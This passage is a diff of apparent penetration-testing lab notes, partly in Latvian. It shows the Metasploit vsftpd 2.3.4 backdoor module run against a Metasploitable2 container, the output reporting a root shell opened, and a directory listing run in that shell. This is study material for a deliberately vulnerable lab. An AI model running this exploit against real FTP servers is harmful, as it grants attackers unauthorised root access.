@@ -59,3 +59,24 @@ View the full module info with the info, or info -d command.
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
 
 ```
+**msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit**
+```
+[*] 192.168.1.11:21 - The port used by the backdoor bind listener is already open
+[+] 192.168.1.11:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (192.168.1.175:39391 -> 192.168.1.11:6200) at 2025-05-22 21:16:04 +0300
+```
+**ls /home**
+```
+ftp
+msfadmin
+service
+user
+```
+**ls /home** (no docker konteinera, kurā ir uzstadīts metasploitable2)
+```
+root@b2bd6545425e:/# ls /home
+ftp  msfadmin  service  user
+
+```
+
